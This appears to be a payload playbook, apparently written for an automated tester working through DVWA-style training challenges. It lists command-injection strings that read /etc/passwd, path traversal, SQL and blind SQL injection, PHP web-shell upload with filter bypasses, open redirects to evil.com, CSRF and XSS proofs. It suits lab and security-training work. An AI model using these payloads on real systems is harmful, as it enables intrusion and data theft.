document: Brute Force / Credential login — authenticate as a valid user. Try common/default credentials first: admin/password, admin/admin, admin/letmein. DVWA-style apps: the admin account password is often "password". If an anti-CSRF token is present, fetch it from the login page and submit it with each attempt. Success = a logged-in indicator ("Welcome"/dashboard), not the login page.

OS Command Injection — append a second command using a shell separator. (Prefer the SIMPLEST payload that proves it; escalate only if it fails. Do not over-engineer.) Separators to try: ; | & && || and newline %0a. Unix target (distinctive output): ; id | whoami & cat /etc/passwd Windows target (use Windows commands, distinctive output "Directory of"): & dir | dir | ipconfig | systeminfo If spaces around the separator are filtered, try it with NO space: 127.0.0.1|dir Confirm by distinctive command output appearing in the response.

Cross-Site Request Forgery — perform a state-changing action as the victim. Submit the target form (e.g. change-password) with attacker-chosen values; the vulnerable endpoint accepts it without a valid anti-CSRF token. Change password: set password_new=password and password_conf=password (must match). If an anti-CSRF token is required, first GET the page, read the user_token, and include it in the request. Success = "Password Changed".

File Inclusion / Path Traversal — include a local server file. (Prefer the SIMPLEST payload that proves it; escalate only if it fails. Do not over-engineer.) Windows target file: C:\Windows\win.ini (contains "[fonts]","[extensions]"). Unix target file: /etc/passwd. Payloads: C:\Windows\win.ini (absolute path, no ../ to strip) file:///C:/Windows/win.ini (file:// scheme; also when value must start with 'file') ../../../../etc/passwd (traversal, climb enough levels) If "../" is stripped once (non-recursive), an absolute path bypasses it, or use nested traversal that survives one pass: ....//....//....// Do NOT inject a command here — the value is included as a FILE path, not run.

Client-side JS token challenge — submit the token the page's JavaScript expects. The page computes a token in client-side JS (sometimes obfuscated). Rather than guessing, reproduce the page's own algorithm (e.g. md5(rot13(phrase)) or a reversed/encoded string) and submit that token with the request. Success = the server accepts the token ("Well done").

Open Redirect — make the server redirect to an attacker-controlled external host. ?redirect=https://evil.com //evil.com (scheme-relative; bypasses an "http(s)://" filter) /\evil.com https://good.com@evil.com Success = an HTTP 3xx with Location pointing at the external host.

SQL Injection — try the SIMPLEST payload first; escalate only if it fails. STEP 1 (almost always works) — OR-tautology to force all rows: string context: ' OR '1'='1' -- string (no comment needed): ' OR '1'='1 numeric context (no quotes): 1 OR 1=1 login bypass: admin'-- STEP 2 — only if the tautology truly fails, extract columns with UNION. You MUST match the column count exactly or you get "Unknown column"/"different number of columns": ' UNION SELECT NULL-- - then add NULLs one by one until the error disappears. NOTES: a syntax error means your input reached the query (good) — fix quoting, don't give up. Do NOT jump straight to UNION; the tautology is simpler and more reliable. Comment with "-- " (trailing space) or "#".

Blind SQL Injection — no data echoed; infer from true/false difference. Boolean payloads (force TRUE vs FALSE and compare the response): ' AND '1'='1 (true) vs ' AND '1'='2 (false) ' OR '1'='1 1 AND 1=1 (true, numeric) vs 1 AND 1=2 (false) 1 OR 1=1 The exists/true branch typically returns "exists" / normal page; the false branch returns "missing" / different page. Prefer a simple OR/AND tautology that breaks out of the quoting. Avoid time-based unless boolean fails.

Insecure File Upload — get an executable file accepted. Upload a PHP web shell: filename ending in .php containing <?php echo 'MARKER'; ?> Bypass content-type check: declare Content-Type: image/jpeg while body is PHP. Bypass extension filter: double extension shell.php.jpg, or shell.pHp, or .phtml. After upload, request the uploaded file's URL to execute it and see the marker.

Weak Session IDs — show the issued session identifiers are predictable. Request several new session IDs and compare them: - sequential integers (1,2,3...) -> predictable, forge the next; - consecutive timestamps -> predictable; - md5/hash of a sequence/counter -> reversible pattern. Demonstrate predictability = the vulnerability; no payload injection needed.

Cross-Site Scripting (reflected/stored/DOM) — vectors that execute JS. (Prefer the SIMPLEST payload that proves it; escalate only if it fails. Do not over-engineer.) Simplest proof (try FIRST, send RAW, do not URL-encode): If " '> DOM XSS: the value is written by client-side JS; deliver via the URL fragment (#...) when the server validates the query but not the fragment: # Goal is just to prove execution (a popup/alert). Keep it simple — do NOT build cookie exfiltration/BeEF/external-script payloads; a plain inline alert is enough.
